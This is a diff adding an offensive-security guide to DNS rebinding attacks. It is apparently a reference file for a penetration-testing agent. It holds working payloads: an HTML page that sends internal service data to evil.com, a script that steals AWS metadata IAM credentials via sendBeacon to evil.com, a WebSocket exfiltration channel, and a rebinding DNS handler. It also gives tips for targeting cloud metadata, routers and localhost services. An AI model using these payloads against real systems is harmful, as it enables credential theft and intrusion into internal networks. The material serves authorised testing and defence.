@@ -1,0 +1,333 @@
+<dns_rebinding_guide>
+<title>DNS REBINDING ATTACKS</title>
+
+<critical>DNS rebinding exploits browser Same-Origin Policy by changing DNS resolution between requests. Initially points to attacker server, then rebinds to internal/localhost targets. Enables access to cloud metadata (169.254.169.254), internal services, IoT devices, and bypasses firewall restrictions. Focus on time-based rebinding, multiple A records, and WebSocket abuse.</critical>
+
+<scope>
+- Internal service access via rebinding (localhost, RFC1918, link-local)
+- Cloud metadata endpoint access (AWS, GCP, Azure)
+- Router/IoT admin panel exploitation
+- WebSocket DNS rebinding for persistent connections
+- Browser DNS cache exploitation
+- Multiple A record race conditions
+- Time-based TTL manipulation
+- CORS bypass via origin confusion
+</scope>
+
+<methodology>
+1. Identify targets: localhost services, internal IPs, cloud metadata, routers
+2. Setup DNS server with low TTL (0-1 seconds) returning attacker IP first
+3. Load attacker page, establish connection, perform CSRF/token collection
+4. DNS rebinds to target IP (127.0.0.1, 192.168.x.x, 169.254.169.254)
+5. Make requests from browser—now same-origin as target
+6. Exfiltrate data to attacker server before DNS rebinds again
+7. Use WebSocket for persistent connection across rebinding
+</methodology>
+
+<attack_vectors>
+<time_based_rebinding>
+- DNS record with TTL=0 or very low (1-5 seconds)
+- First resolution: attacker-controlled IP (203.0.113.1)
+- Wait for browser to establish session, execute JS
+- After delay: DNS updates to target IP (127.0.0.1)
+- Subsequent requests resolve to target
+- Browser thinks same origin (same domain name)
+
+Example flow:
+1. Victim visits attacker.com (resolves to 203.0.113.1)
+2. Loads malicious JS from attacker server
+3. JS makes fetch() to http://attacker.com:8080
+4. DNS rebinds: attacker.com now resolves to 127.0.0.1
+5. Browser makes request to http://127.0.0.1:8080 (bypassing SOP)
+</time_based_rebinding>
+
+<multiple_a_records>
+- DNS returns multiple A records in single response
+- First record: attacker IP (public)
+- Second record: target IP (internal)
+- Browser/OS may round-robin or randomly choose
+- Race condition: some requests hit attacker, some hit target
+- Retry logic eventually hits target IP
+
+Example:
+attacker.com IN A 203.0.113.1
+attacker.com IN A 127.0.0.1
+attacker.com IN A 192.168.1.1
+
+Browser randomly selects, creates opportunity for rebinding
+</multiple_a_records>
+
+<pin_and_rebind>
+- Establish connection to attacker server
+- Collect session token, CSRF token, nonce
+- Store in localStorage/sessionStorage
+- Trigger DNS rebind to target
+- Replay tokens to target (same origin now)
+- Useful for authenticated internal services
+</pin_and_rebind>
+</attack_vectors>
+
+<target_scenarios>
+<cloud_metadata>
+<aws_imds>
+- Target: http://169.254.169.254/latest/meta-data/
+- Goal: steal IAM credentials from /iam/security-credentials/{role}
+- Payload:
+  1. Rebind attacker.com → 169.254.169.254
+  2. fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')
+  3. Exfiltrate credentials to attacker
+
+Bypass IMDSv2 (requires PUT for token):
+- Limited by browser fetch() API
+- WebSocket may allow custom methods
+- Some browsers/libraries allow PUT via fetch()
+</aws_imds>
+
+<gcp_metadata>
+- Target: http://metadata.google.internal/computeMetadata/v1/
+- Requires header: Metadata-Flavor: Google
+- Rebinding challenge: custom header in fetch()
+- Possible if target reflects headers or has CORS misconfiguration
+</gcp_metadata>
+
+<azure_metadata>
+- Target: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+- Requires header: Metadata: true
+- Similar header challenge as GCP
+</azure_metadata>
+</cloud_metadata>
+
+<internal_services>
+- Redis (6379): HTTP requests may be interpreted as commands
+- Elasticsearch (9200): REST API accessible
+- Docker API (2375): Container management
+- Jenkins, Grafana, internal dashboards
+- Corporate intranet sites
+- Development servers, staging environments
+</internal_services>
+
+<localhost_applications>
+- Local web servers (dev environments)
+- Desktop applications with HTTP APIs (Electron apps)
+- Browser extensions with local servers
+- Mobile debugging interfaces
+- Local databases with HTTP interfaces
+</localhost_applications>
+
+<iot_devices>
+- Router admin panels (192.168.0.1, 192.168.1.1)
+- Smart home devices
+- IP cameras
+- Network printers
+- Default credentials often present
+</iot_devices>
+</target_scenarios>
+
+<browser_specific_techniques>
+<dns_cache_exploitation>
+- Browsers cache DNS independently of OS
+- Chrome: up to 60 seconds default
+- Firefox: respects TTL but min ~1 second
+- Safari: respects system cache
+
+Exploit:
+- Set low TTL (0-1s)
+- Rapidly make requests to trigger cache refresh
+- Race condition between cache expiry and rebind
+</dns_cache_exploitation>
+
+<websocket_rebinding>
+- WebSocket connections persist across DNS changes
+- Establish WebSocket to attacker server
+- DNS rebinds to target
+- New WebSocket connections go to target
+- Existing connection to attacker remains (for exfiltration)
+
+Example:
+ws = new WebSocket('ws://attacker.com:8080');
+ws.onopen = () => {
+  // Wait for rebind
+  setTimeout(() => {
+    fetch('http://attacker.com/internal-api')
+      .then(r => r.text())
+      .then(data => ws.send(data)); // exfil via existing WS
+  }, 5000);
+};
+</websocket_rebinding>
+
+<iframe_rebinding>
+- Load attacker page in iframe
+- Parent page and iframe share origin after rebind
+- Cross-frame communication becomes same-origin
+- Bypass iframe sandbox restrictions
+</iframe_rebinding>
+</browser_specific_techniques>
+
+<dns_server_requirements>
+<dynamic_dns>
+- Authoritative DNS server with programmatic control
+- Python dnslib, PowerDNS with API, custom NS server
+- Return different IPs based on query count, time, source IP
+
+Example (Python):
+class RebindHandler:
+    def __init__(self):
+        self.queries = {}
+    
+    def resolve(self, domain, source_ip):
+        if self.queries.get(source_ip, 0) < 3:
+            self.queries[source_ip] = self.queries.get(source_ip, 0) + 1
+            return '203.0.113.1'  # attacker IP
+        else:
+            return '127.0.0.1'  # target IP
+</dynamic_dns>
+
+<ttl_manipulation>
+- TTL=0 for immediate expiry
+- TTL=1 for rapid rebinding
+- Some resolvers ignore TTL=0, use TTL=1 minimum
+- Chrome respects TTL but caches for minimum ~1s
+</ttl_manipulation>
+
+<wildcard_dns>
+- *.attacker.com returns controlled IPs
+- Use subdomains to isolate attacks:
+  - victim1.attacker.com → 192.168.1.1
+  - victim2.attacker.com → 127.0.0.1
+- Allows per-target rebinding configuration
+</wildcard_dns>
+</dns_server_requirements>
+
+<defenses_and_bypasses>
+<dns_pinning>
+- Browsers pin DNS for connection duration
+- Bypass: close connection, wait for pin to expire
+- New connection triggers new DNS lookup
+- Force connection close via HTTP/1.0 or Connection: close
+</dns_pinning>
+
+<host_header_validation>
+- Servers check Host header against whitelist
+- Bypass: use IP address in URL, Host header intact
+- Or: find server that doesn't validate Host
+</host_header_validation>
+
+<authentication_tokens>
+- Internal services may require auth
+- Steal tokens via initial phase (before rebind)
+- CSRF tokens, session cookies, JWT
+- Replay after rebinding to target
+</authentication_tokens>
+</defenses_and_bypasses>
+
+<exploitation_payloads>
+<basic_rebind>
+<!DOCTYPE html>
+<html>
+<head><title>DNS Rebinding</title></head>
+<body>
+<script>
+// Phase 1: Attacker server (203.0.113.1)
+fetch('http://attacker.com/collect-info')
+  .then(r => r.json())
+  .then(data => {
+    console.log('Collected:', data);
+    
+    // Wait for DNS rebind
+    setTimeout(() => {
+      // Phase 2: Target server (127.0.0.1)
+      fetch('http://attacker.com:8080/admin/status')
+        .then(r => r.text())
+        .then(internal => {
+          // Exfiltrate
+          fetch('http://evil.com/log?data=' + btoa(internal));
+        });
+    }, 5000);
+  });
+</script>
+</body>
+</html>
+</basic_rebind>
+
+<metadata_theft>
+<script>
+// AWS IMDS credential theft
+const domain = 'rebind.attacker.com';
+
+fetch(`http://${domain}/latest/meta-data/iam/security-credentials/`)
+  .then(r => r.text())
+  .then(role => {
+    fetch(`http://${domain}/latest/meta-data/iam/security-credentials/${role}`)
+      .then(r => r.json())
+      .then(creds => {
+        // Exfil credentials
+        navigator.sendBeacon('https://evil.com/steal', JSON.stringify(creds));
+      });
+  });
+</script>
+</metadata_theft>
+
+<websocket_persistent>
+<script>
+// Persistent connection for data exfil
+const ws = new WebSocket('ws://attacker.com:8080');
+
+ws.onopen = () => {
+  console.log('Exfil channel open');
+  
+  setTimeout(() => {
+    // After rebind, access internal service
+    fetch('http://attacker.com:9200/_cat/indices')
+      .then(r => r.text())
+      .then(data => ws.send(data));
+  }, 3000);
+};
+</script>
+</websocket_persistent>
+</exploitation_payloads>
+
+<validation>
+1. Setup controlled DNS server with rebinding capability
+2. Demonstrate initial connection to attacker IP (203.0.113.1)
+3. Show DNS resolution change to target IP (127.0.0.1 or internal)
+4. Prove browser makes request to target thinking same-origin
+5. Capture internal response and exfiltrate to attacker
+6. Test with multiple browsers to show consistency
+7. Demonstrate impact: credential theft, internal data access, or service control
+</validation>
+
+<false_positives>
+- DNS changes that don't result in browser requests
+- Blocked by browser security features (CORB, CORP)
+- Internal services with strong authentication
+- DNS pinning preventing rebinding
+- Network firewalls blocking internal access
+</false_positives>
+
+<impact>
+- Cloud credential theft (AWS/GCP/Azure metadata)
+- Internal network reconnaissance and exploitation
+- Router/IoT device compromise
+- Private data exfiltration from localhost services
+- Corporate intranet access
+- Bypass of network-based access controls
+- Cross-site request forgery on internal services
+</impact>
+
+<pro_tips>
+1. TTL=0 or TTL=1 for rapid rebinding—test browser caching behavior
+2. Use multiple A records for race condition approach (simpler setup)
+3. WebSocket provides persistent exfil channel during rebinding
+4. Target 169.254.169.254 first (cloud metadata)—high impact, common target
+5. Test localhost ports: 8080, 9200, 6379, 2375, 5000 for common services
+6. Collect auth tokens before rebind, replay after to target
+7. Use iframes to isolate rebinding from main page
+8. Monitor DNS queries to confirm rebinding occurred
+9. Some browsers block localhost/RFC1918 in mixed content—use HTTP everywhere
+10. Test on cloud VMs—most vulnerable to metadata attacks
+11. Combine with CSRF payloads for admin actions on internal services
+12. Use wildcard DNS for flexible target configuration per victim
+</pro_tips>
+
+<remember>DNS rebinding bypasses Same-Origin Policy by making internal resources appear same-origin. Defend with DNS pinning, Host header validation, authentication on internal services, and blocking external DNS resolution to internal IPs. Always require authentication on services listening on localhost or internal networks.</remember>
+</dns_rebinding_guide>
